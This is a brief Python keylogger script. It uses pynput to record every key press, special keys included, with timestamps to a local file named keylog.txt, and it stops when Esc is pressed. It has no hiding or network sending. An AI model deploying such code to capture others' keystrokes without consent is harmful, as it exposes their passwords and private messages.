from pynput import keyboard
import logging

# Configure the logging
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key press
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
